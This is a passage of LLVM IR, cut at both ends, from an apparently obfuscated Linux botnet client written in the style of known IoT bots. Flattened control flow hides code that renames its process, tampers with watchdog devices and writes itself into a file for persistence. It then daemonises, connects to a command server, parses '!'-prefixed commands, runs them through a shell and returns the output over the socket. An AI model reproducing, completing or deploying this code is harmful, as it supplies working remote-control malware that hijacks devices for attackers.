  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, %48
  call void @srand(i32 %49) #2
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = call i32 @getpid() #2
  %52 = xor i32 %50, %51
  call void @init_rand(i32 %52)
  store i32 0, i32* %7, align 4
  %53 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.131, i32 0, i32 0))
  %54 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.132, i32 0, i32 0))
  store i32 0, i32* %8, align 4
  %55 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i32 0, i32 0), i32 2)
  store i32 %55, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %8, align 4
  %switchVar = alloca i32
  store i32 1749727511, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1749727511, label %first
    i32 748008370, label %58
    i32 600802339, label %62
    i32 241549974, label %68
    i32 1050515577, label %69
    i32 -442047480, label %73
    i32 1224834298, label %74
    i32 1017866425, label %80
    i32 -1098009266, label %83
    i32 -2058503020, label %87
    i32 1785116384, label %99
    i32 1305574838, label %100
    i32 -2020660041, label %111
    i32 -56980212, label %114
    i32 165840081, label %124
    i32 -743764606, label %130
    i32 -2122931613, label %139
    i32 1387576146, label %142
    i32 1778822654, label %143
    i32 1019701697, label %147
    i32 -477881119, label %155
    i32 1390387767, label %161
    i32 730060933, label %162
    i32 873952038, label %165
    i32 1655314167, label %166
    i32 1416618004, label %169
    i32 -1740949466, label %170
    i32 1035972690, label %175
    i32 909668792, label %176
    i32 -1933400426, label %180
    i32 465786884, label %184
    i32 -307800134, label %186
    i32 1569827739, label %191
    i32 1558105483, label %197
    i32 -1961897077, label %198
    i32 35959318, label %204
    i32 347703551, label %213
    i32 1930570997, label %216
    i32 -2010601706, label %222
    i32 1782037736, label %233
    i32 90722175, label %236
    i32 205184559, label %249
    i32 104953889, label %255
    i32 853362547, label %265
    i32 1350657215, label %268
    i32 26369699, label %272
    i32 1844916495, label %273
    i32 -297581454, label %276
    i32 -425941578, label %286
    i32 -1431040525, label %289
    i32 52289160, label %296
    i32 906112252, label %299
    i32 -1406600364, label %305
    i32 192903457, label %310
    i32 1849621001, label %312
    i32 1241750207, label %315
    i32 754205159, label %321
    i32 -810855499, label %322
    i32 1726849678, label %331
    i32 1950847453, label %341
    i32 1406885715, label %350
    i32 813745804, label %352
    i32 603320008, label %358
    i32 336593861, label %360
    i32 312660296, label %366
    i32 -1826359626, label %371
    i32 -1540501661, label %373
    i32 -1500994062, label %376
    i32 -425130430, label %381
    i32 1482269304, label %386
    i32 -1932132595, label %395
    i32 1395833596, label %400
    i32 162939113, label %404
    i32 -557452629, label %405
    i32 -1622936314, label %412
    i32 -1916664075, label %418
    i32 -259307912, label %425
    i32 1855485577, label %428
    i32 -1572961892, label %433
    i32 1893701817, label %437
    i32 914511192, label %443
    i32 232105117, label %466
    i32 -276632251, label %468
    i32 828994234, label %474
    i32 425410738, label %475
    i32 -2113709931, label %480
    i32 1946260616, label %485
    i32 1879057502, label %488
    i32 -1612269445, label %489
    i32 705157350, label %490
    i32 -1930137411, label %491
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %56 = icmp ne i32 %.reload, -1
  %57 = select i1 %56, i32 600802339, i32 748008370
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.134, i32 0, i32 0), i32 2)
  store i32 %59, i32* %8, align 4
  %60 = icmp ne i32 %59, -1
  %61 = select i1 %60, i32 600802339, i32 1224834298
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %63 = load i32, i32* %8, align 4
  %64 = call i32 (i32, i64, ...) @ioctl(i32 %63, i64 2147768068, i32* %9) #2
  %65 = call i32 @fork() #2
  store i32 %65, i32* %10, align 4
  %66 = icmp eq i32 %65, 0
  %67 = select i1 %66, i32 241549974, i32 -442047480
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 1050515577, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %8, align 4
  %71 = call i32 (i32, i64, ...) @ioctl(i32 %70, i64 2147768069, i32 0) #2
  %72 = call i32 @sleep(i32 10)
  store i32 1050515577, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 1224834298, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.135, i32 0, i32 0), i8** %12, align 8
  %75 = load i8*, i8** %12, align 8
  %76 = call %struct._IO_FILE* @fopen(i8* %75, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %76, %struct._IO_FILE** %13, align 8
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %78 = icmp eq %struct._IO_FILE* %77, null
  %79 = select i1 %78, i32 1017866425, i32 -1098009266
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.137, i32 0, i32 0), i8** %12, align 8
  %81 = load i8*, i8** %12, align 8
  %82 = call %struct._IO_FILE* @fopen(i8* %81, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %82, %struct._IO_FILE** %13, align 8
  store i32 -1098009266, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %85 = icmp ne %struct._IO_FILE* %84, null
  %86 = select i1 %85, i32 -2058503020, i32 -1740949466
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 0
  %90 = load i8*, i8** %89, align 8
  %91 = call i64 @strlen(i8* %90) #10
  %92 = trunc i64 %91 to i32
  store i32 %92, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %93 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %94 = call i8* @getcwd(i8* %93, i64 256) #2
  %95 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %96 = call i32 @strcmp(i8* %95, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #10
  %97 = icmp ne i32 %96, 0
  %98 = select i1 %97, i32 1785116384, i32 1655314167
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 1305574838, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i8**, i8*** %5, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = load i32, i32* %16, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp ne i32 %108, 47
  %110 = select i1 %109, i32 -2020660041, i32 -56980212
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %16, align 4
  %113 = add nsw i32 %112, -1
  store i32 %113, i32* %16, align 4
  store i32 1305574838, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %116 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %117 = load i8**, i8*** %5, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 0
  %119 = load i8*, i8** %118, align 8
  %120 = load i32, i32* %16, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = call i32 (i8*, i8*, ...) @sprintf(i8* %115, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0), i8* %116, i8* %122) #2
  store i32 165840081, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %126 = call i32 @feof(%struct._IO_FILE* %125) #2
  %127 = icmp ne i32 %126, 0
  %128 = xor i1 %127, true
  %129 = select i1 %128, i32 -743764606, i32 1778822654
  store i32 %129, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %132 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %133 = call i8* @fgets(i8* %131, i32 1024, %struct._IO_FILE* %132)
  %134 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %135 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %136 = call i32 @strcasecmp(i8* %134, i8* %135) #10
  %137 = icmp ne i32 %136, 0
  %138 = select i1 %137, i32 1387576146, i32 -2122931613
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %17, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %17, align 4
  store i32 1387576146, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  store i32 165840081, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* %17, align 4
  %145 = icmp eq i32 %144, 0
  %146 = select i1 %145, i32 1019701697, i32 730060933
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %149 = call i32 @fclose(%struct._IO_FILE* %148)
  %150 = load i8*, i8** %12, align 8
  %151 = call %struct._IO_FILE* @fopen(i8* %150, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0))
  store %struct._IO_FILE* %151, %struct._IO_FILE** %18, align 8
  %152 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %153 = icmp ne %struct._IO_FILE* %152, null
  %154 = select i1 %153, i32 -477881119, i32 1390387767
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %157 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %158 = call i32 @fputs(i8* %156, %struct._IO_FILE* %157)
  %159 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %160 = call i32 @fclose(%struct._IO_FILE* %159)
  store i32 1390387767, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 873952038, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %164 = call i32 @fclose(%struct._IO_FILE* %163)
  store i32 873952038, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  store i32 1416618004, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %168 = call i32 @fclose(%struct._IO_FILE* %167)
  store i32 1416618004, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  store i32 -1740949466, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = call i32 @getOurIP()
  %172 = call i32 @fork() #2
  %173 = icmp sgt i32 %172, 0
  %174 = select i1 %173, i32 1035972690, i32 909668792
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  ret i32 0

; <label>:176:                                    ; preds = %loopEntry
  %177 = call i32 @setsid() #2
  store i32 %177, i32* @pgid, align 4
  %178 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %179 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 -1933400426, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @initConnection()
  %182 = icmp ne i32 %181, 0
  %183 = select i1 %182, i32 465786884, i32 -307800134
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = call i32 @sleep(i32 5)
  store i32 -1933400426, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i32, i32* @mainCommSock, align 4
  %188 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %189 = call i8* @inet_ntoa(i32 %188) #2
  %190 = call i32 (i32, i8*, ...) @sockprintf(i32 %187, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.140, i32 0, i32 0), i8* %189, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0))
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  store i32 1569827739, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = load i32, i32* @mainCommSock, align 4
  %193 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %194 = call i32 @recvLine(i32 %192, i8* %193, i32 4096)
  store i32 %194, i32* %20, align 4
  %195 = icmp ne i32 %194, -1
  %196 = select i1 %195, i32 1558105483, i32 -1930137411
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 0, i32* %21, align 4
  store i32 -1961897077, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i32, i32* %21, align 4
  %200 = sext i32 %199 to i64
  %201 = load i64, i64* @numpids, align 8
  %202 = icmp ult i64 %200, %201
  %203 = select i1 %202, i32 35959318, i32 -297581454
  store i32 %203, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i32*, i32** @pids, align 8
  %206 = load i32, i32* %21, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = call i32 @waitpid(i32 %209, i32* null, i32 1)
  %211 = icmp sgt i32 %210, 0
  %212 = select i1 %211, i32 347703551, i32 26369699
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i32, i32* %21, align 4
  %215 = add nsw i32 %214, 1
  store i32 %215, i32* %23, align 4
  store i32 1930570997, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i32, i32* %23, align 4
  %218 = zext i32 %217 to i64
  %219 = load i64, i64* @numpids, align 8
  %220 = icmp ult i64 %218, %219
  %221 = select i1 %220, i32 -2010601706, i32 90722175
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i32*, i32** @pids, align 8
  %224 = load i32, i32* %23, align 4
  %225 = zext i32 %224 to i64
  %226 = getelementptr inbounds i32, i32* %223, i64 %225
  %227 = load i32, i32* %226, align 4
  %228 = load i32*, i32** @pids, align 8
  %229 = load i32, i32* %23, align 4
  %230 = sub i32 %229, 1
  %231 = zext i32 %230 to i64
  %232 = getelementptr inbounds i32, i32* %228, i64 %231
  store i32 %227, i32* %232, align 4
  store i32 1782037736, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* %23, align 4
  %235 = add i32 %234, 1
  store i32 %235, i32* %23, align 4
  store i32 1930570997, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i32*, i32** @pids, align 8
  %238 = load i32, i32* %23, align 4
  %239 = sub i32 %238, 1
  %240 = zext i32 %239 to i64
  %241 = getelementptr inbounds i32, i32* %237, i64 %240
  store i32 0, i32* %241, align 4
  %242 = load i64, i64* @numpids, align 8
  %243 = add i64 %242, -1
  store i64 %243, i64* @numpids, align 8
  %244 = load i64, i64* @numpids, align 8
  %245 = add i64 %244, 1
  %246 = mul i64 %245, 4
  %247 = call noalias i8* @malloc(i64 %246) #2
  %248 = bitcast i8* %247 to i32*
  store i32* %248, i32** %22, align 8
  store i32 0, i32* %23, align 4
  store i32 205184559, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %23, align 4
  %251 = zext i32 %250 to i64
  %252 = load i64, i64* @numpids, align 8
  %253 = icmp ult i64 %251, %252
  %254 = select i1 %253, i32 104953889, i32 1350657215
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i32*, i32** @pids, align 8
  %257 = load i32, i32* %23, align 4
  %258 = zext i32 %257 to i64
  %259 = getelementptr inbounds i32, i32* %256, i64 %258
  %260 = load i32, i32* %259, align 4
  %261 = load i32*, i32** %22, align 8
  %262 = load i32, i32* %23, align 4
  %263 = zext i32 %262 to i64
  %264 = getelementptr inbounds i32, i32* %261, i64 %263
  store i32 %260, i32* %264, align 4
  store i32 853362547, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i32, i32* %23, align 4
  %267 = add i32 %266, 1
  store i32 %267, i32* %23, align 4
  store i32 205184559, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i32*, i32** @pids, align 8
  %270 = bitcast i32* %269 to i8*
  call void @free(i8* %270) #2
  %271 = load i32*, i32** %22, align 8
  store i32* %271, i32** @pids, align 8
  store i32 26369699, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  store i32 1844916495, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i32, i32* %21, align 4
  %275 = add nsw i32 %274, 1
  store i32 %275, i32* %21, align 4
  store i32 -1961897077, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %277 = load i32, i32* %20, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %278
  store i8 0, i8* %279, align 1
  %280 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %280)
  %281 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %282 = call i8* @strstr(i8* %281, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  %283 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %284 = icmp eq i8* %282, %283
  %285 = select i1 %284, i32 -425941578, i32 -1431040525
  store i32 %285, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i32, i32* @mainCommSock, align 4
  %288 = call i32 (i32, i8*, ...) @sockprintf(i32 %287, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i32 0, i32 0))
  store i32 1569827739, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %290, i8** %24, align 8
  %291 = load i8*, i8** %24, align 8
  %292 = load i8, i8* %291, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp eq i32 %293, 33
  %295 = select i1 %294, i32 52289160, i32 705157350
  store i32 %295, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %24, align 8
  %298 = getelementptr inbounds i8, i8* %297, i64 1
  store i8* %298, i8** %25, align 8
  store i32 906112252, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8*, i8** %25, align 8
  %301 = load i8, i8* %300, align 1
  %302 = zext i8 %301 to i32
  %303 = icmp ne i32 %302, 32
  %304 = select i1 %303, i32 -1406600364, i32 192903457
  store i32 %304, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8*, i8** %25, align 8
  %307 = load i8, i8* %306, align 1
  %308 = zext i8 %307 to i32
  %309 = icmp ne i32 %308, 0
  store i32 192903457, i32* %switchVar
  store i1 %309, i1* %.reg2mem3
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %311 = select i1 %.reload4, i32 1849621001, i32 1241750207
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i8*, i8** %25, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %25, align 8
  store i32 906112252, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i8*, i8** %25, align 8
  %317 = load i8, i8* %316, align 1
  %318 = zext i8 %317 to i32
  %319 = icmp eq i32 %318, 0
  %320 = select i1 %319, i32 754205159, i32 -810855499
  store i32 %320, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  store i32 1569827739, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i8*, i8** %25, align 8
  store i8 0, i8* %323, align 1
  %324 = load i8*, i8** %24, align 8
  %325 = getelementptr inbounds i8, i8* %324, i64 1
  store i8* %325, i8** %25, align 8
  %326 = load i8*, i8** %24, align 8
  %327 = load i8*, i8** %25, align 8
  %328 = call i64 @strlen(i8* %327) #10
  %329 = getelementptr inbounds i8, i8* %326, i64 %328
  %330 = getelementptr inbounds i8, i8* %329, i64 2
  store i8* %330, i8** %24, align 8
  store i32 1726849678, i32* %switchVar
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  %332 = load i8*, i8** %24, align 8
  %333 = load i8*, i8** %24, align 8
  %334 = call i64 @strlen(i8* %333) #10
  %335 = sub i64 %334, 1
  %336 = getelementptr inbounds i8, i8* %332, i64 %335
  %337 = load i8, i8* %336, align 1
  %338 = zext i8 %337 to i32
  %339 = icmp eq i32 %338, 10
  %340 = select i1 %339, i32 1406885715, i32 1950847453
  store i32 %340, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i8*, i8** %24, align 8
  %343 = load i8*, i8** %24, align 8
  %344 = call i64 @strlen(i8* %343) #10
  %345 = sub i64 %344, 1
  %346 = getelementptr inbounds i8, i8* %342, i64 %345
  %347 = load i8, i8* %346, align 1
  %348 = zext i8 %347 to i32
  %349 = icmp eq i32 %348, 13
  store i32 1406885715, i32* %switchVar
  store i1 %349, i1* %.reg2mem5
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %351 = select i1 %.reload6, i32 813745804, i32 603320008
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i8*, i8** %24, align 8
  %354 = load i8*, i8** %24, align 8
  %355 = call i64 @strlen(i8* %354) #10
  %356 = sub i64 %355, 1
  %357 = getelementptr inbounds i8, i8* %353, i64 %356
  store i8 0, i8* %357, align 1
  store i32 1726849678, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i8*, i8** %24, align 8
  store i8* %359, i8** %26, align 8
  store i32 336593861, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i8*, i8** %24, align 8
  %362 = load i8, i8* %361, align 1
  %363 = zext i8 %362 to i32
  %364 = icmp ne i32 %363, 32
  %365 = select i1 %364, i32 312660296, i32 -1826359626
  store i32 %365, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = load i8*, i8** %24, align 8
  %368 = load i8, i8* %367, align 1
  %369 = zext i8 %368 to i32
  %370 = icmp ne i32 %369, 0
  store i32 -1826359626, i32* %switchVar
  store i1 %370, i1* %.reg2mem7
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %372 = select i1 %.reload8, i32 -1540501661, i32 -1500994062
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8*, i8** %24, align 8
  %375 = getelementptr inbounds i8, i8* %374, i32 1
  store i8* %375, i8** %24, align 8
  store i32 336593861, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load i8*, i8** %24, align 8
  store i8 0, i8* %377, align 1
  %378 = load i8*, i8** %24, align 8
  %379 = getelementptr inbounds i8, i8* %378, i32 1
  store i8* %379, i8** %24, align 8
  %380 = load i8*, i8** %26, align 8
  store i8* %380, i8** %27, align 8
  store i32 -425130430, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = load i8*, i8** %27, align 8
  %383 = load i8, i8* %382, align 1
  %384 = icmp ne i8 %383, 0
  %385 = select i1 %384, i32 1482269304, i32 -1932132595
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i8*, i8** %27, align 8
  %388 = load i8, i8* %387, align 1
  %389 = zext i8 %388 to i32
  %390 = call i32 @toupper(i32 %389) #10
  %391 = trunc i32 %390 to i8
  %392 = load i8*, i8** %27, align 8
  store i8 %391, i8* %392, align 1
  %393 = load i8*, i8** %27, align 8
  %394 = getelementptr inbounds i8, i8* %393, i32 1
  store i8* %394, i8** %27, align 8
  store i32 -425130430, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i8*, i8** %26, align 8
  %397 = call i32 @strcmp(i8* %396, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.143, i32 0, i32 0)) #10
  %398 = icmp eq i32 %397, 0
  %399 = select i1 %398, i32 1395833596, i32 1855485577
  store i32 %399, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  %401 = call i32 @listFork()
  %402 = icmp ne i32 %401, 0
  %403 = select i1 %402, i32 162939113, i32 -557452629
  store i32 %403, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  store i32 1569827739, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %406, i8 0, i64 1024, i32 16, i1 false)
  %407 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %408 = load i8*, i8** %24, align 8
  %409 = call i32 (i8*, i8*, ...) @szprintf(i8* %407, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i32 0, i32 0), i8* %408)
  %410 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %411 = call i32 @fdpopen(i8* %410, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store i32 %411, i32* %29, align 4
  store i32 -1622936314, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %414 = load i32, i32* %29, align 4
  %415 = call i8* @fdgets(i8* %413, i32 1024, i32 %414)
  %416 = icmp ne i8* %415, null
  %417 = select i1 %416, i32 -1916664075, i32 -259307912
  store i32 %417, i32* %switchVar
  br label %loopEnd

; <label>:418:                                    ; preds = %loopEntry
  %419 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %419)
  %420 = load i32, i32* @mainCommSock, align 4
  %421 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %422 = call i32 (i32, i8*, ...) @sockprintf(i32 %420, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.145, i32 0, i32 0), i8* %421)
  %423 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %423, i8 0, i64 1024, i32 16, i1 false)
